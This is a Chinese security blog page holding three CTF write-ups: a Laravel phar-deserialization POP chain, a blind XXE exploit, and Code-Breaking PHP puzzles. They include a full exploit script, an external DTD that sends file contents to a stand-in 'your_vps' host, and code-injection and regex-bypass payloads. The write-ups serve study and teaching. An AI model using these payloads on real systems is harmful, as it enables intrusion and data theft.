<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/09/Code-breaking-medium֮lumenserial/"> 
                    Code-breaking-medium之lumenserial 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-09   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Code-breaking-medium之lumenserial"><a href="#Code-breaking-medium之lumenserial" class="headerlink" title="Code-breaking-medium之lumenserial"></a>Code-breaking-medium之lumenserial</h1><p>一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。</p>
<p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p>
<h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p>
<p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p>
<pre><code>private function download($url)
{
    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
<pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
<p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p>
<pre><code>class PendingBroadcast
{   
public function __construct(Dispatcher $events, $event)
{
    $this-&gt;event = $event;
    $this-&gt;events = $events;
}
public function __destruct()
    {
        $this-&gt;events-&gt;dispatch($this-&gt;event);
    }
}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
<p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p>
<p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p>
<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
<p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p>
<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) 
{
    return $this-&gt;format($method, $attributes);
}</code></pre><p>继续跟进format方法</p>
<pre><code>public function format($formatter, $arguments = array())
{
    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  
}</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
<pre><code>public function getFormatter($formatter)
{
    if (isset($this-&gt;formatters[$formatter])) {
        return $this-&gt;formatters[$formatter];
    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
<p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p>
<p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p>
<h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p>
<p>这里看到师傅们找的了一个跳板类，赋值给了validator</p>
<p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
<pre><code>namespace PHPUnit\Framework\MockObject\Stub;
class ReturnCallback implements Stub
{
public function invoke(Invocation $invocation)
{
    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());
}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
<p>找到调用这个接口的类就行了，这里是</p>
<pre><code>namespace PHPUnit\Framework\MockObject\Invocation;
class StaticInvocation implements Invocation, SelfDescribing
{
private $parameters;
}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
<h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p>
<p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p>
<h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p>
<pre><code>&lt;?php
namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        function __construct(){
            $this-&gt;events = new \Faker\ValidGenerator();
            $this-&gt;event = &#39;everything&#39;;
        }
    }
}

namespace PHPUnit\Framework\MockObject\Invocation{
    class StaticInvocation{
        function __construct(){
            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);
        }
    }
}

namespace PHPUnit\Framework\MockObject\Stub{
    class ReturnCallback{
        function __construct(){
            $this-&gt;callback = &#39;file_put_contents&#39;;
        }
    }
}

namespace Faker{
    class ValidGenerator{
        function __construct(){
            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));
            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));

            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();

            $this-&gt;validator = array($rc, &quot;invoke&quot;);
            $this-&gt;generator = $g2;
            $this-&gt;maxRetries = 10000;
        }
    }

    class Generator{
        function __construct($form){
            $this-&gt;formatters = $form;
        }
    }

}
namespace{
    $exp = new Illuminate\Broadcasting\PendingBroadcast();
    print_r(urlencode(serialize($exp)));

    // phar
    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);
    $p-&gt;startBuffering();
    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
    $p-&gt;setMetadata($exp);
    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);
    $p-&gt;stopBuffering();
}</code></pre><p>上传文件，接着进行反序列化</p>
<pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
<p>再次膜前辈师傅们</p>

                
            </div>
            <div class="continue">
            <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/07/从两道CTF题目学习XXE漏洞/"> 
                    从两道CTF题目学习XXE漏洞 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-07   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p>
<h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p>
<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p>
<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p>
<p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p>
<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
<p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
<p>关于外部实体引用file协议的例子如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
或者
&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %name;
]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p>
<p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p>
<p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p>
<p><strong>PS：#PCDATA的意思是解析字符数据</strong></p>
<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p>
<p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
<p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p>
<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p>
<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
<p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
<h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
<pre><code>&lt;?php
  function __autoload($cls) {
    include $cls;
  }

  class Black {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);
      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);
      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);

      if ($store) {
            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
      }
    }
  }

  class Green {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);
      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);
      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);

      if ($store) {
            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
      }
    }
  }

  if ($_=@$_GET[&#39;theme&#39;]) {
    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {
      if (@class_exists($_)) {
        ($string = @$_GET[&#39;string&#39;]) || $string = false;
        ($default = @$_GET[&#39;default&#39;]) || $default = false;
        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;

        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);
      }
    }
  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {
    $args = explode(&#39;-&#39;, $_);
    if (class_exists($args[0])) {
      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);
    }
  } else if ($_=@$_GET[&#39;info&#39;]) {
    phpinfo();
  }

  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p>
<p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
<p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
<p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
<p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p>
<p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
<p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
<p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;

&lt;!DOCTYPE ANY[

&lt;!ENTITY % file &quot;hpdoger&quot;&gt;
&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;

%send;
]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
<p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;

&lt;!DOCTYPE ANY[

&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;

%send;
%test;
%back;
]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p>
<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;

&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p>
<pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
<p>其中：</p>
<ul>
<li>外部实体send引入外部DTD声明</li>
<li>参数实体test即为“中间参数实体”</li>
<li>&#37;为了避免编码问题</li>
<li>base64-encode是防止文件内容有空格导致http传输时被截断</li>
</ul>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p>
<ol>
<li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
</li>
<li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p>
</li>
</ol>
<p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p>
<h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p>
<p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p>
<p>漏洞点就在后端解析xml。</p>
<p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p>
<p>在挖掘漏洞的时候尤其注意两点：</p>
<ol>
<li>content-type: application/xml</li>
<li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li>
</ol>
<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
<li><p>对于PHP，禁止引用外部实体</p>
<pre><code>libxml_disable_entity_loader(true);</code></pre></li>
<li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
</li>
</ol>

                
            </div>
            <div class="continue">
            <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/12/21/Code-Breaking-Puzzles WriteUp/"> 
                    Code-Breaking-Puzzles WriteUp 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-12-21   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p>
<h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p>
<pre><code>&lt;?php
$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;

if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
    show_source(__FILE__);
} else {
    $action(&#39;&#39;, $arg);
}</code></pre><p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p>
<p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p>
<p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p>
<p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
<p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p>
<p>别忘了注释//，否则逃脱不了函数</p>
<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><pre><code>&lt;?php
function is_php($data){
    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
if (is_php($data)) {
    echo &quot;bad request&quot;;
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;
    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);

    header(&quot;Location: $path&quot;, true, 303);
} </code></pre><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p>
<p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p>
<h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p>
<p>NFA引擎</p>
<pre><code>**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p>
<pre><code>preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data)</code></pre><p>如果我们输入<code>&lt;?php print;abcd</code></p>
<p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p>
<p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p>
<p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p>
<p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p>
<pre><code>&lt;?php
$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);
$msg = &quot;&lt;?php print_r(scandir(&#39;../&#39;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);
fwrite($f,$msg);
fclose($f);</code></pre><p>构造个上传表单完事</p>
<p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p>
<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p>
<p>当我们可控的文件名$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，$text传入<code>this is test</code>时，file_put_contents($file,$text)执行的内容如下：<br><img src="https://s1.ax1x.com/2018/12/24/F6Hv60.png" alt></p>
<p>可以把写入的文本进行base64编码，而且可以指定写入的文件名<code>shell.php</code>。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过<strong>后端正则对可控文本php危险语句检测</strong>的过滤</p>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>关键代码<br><img src="https://s1.ax1x.com/2018/12/24/F6bp0U.png" alt></p>
<p>$output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。</p>
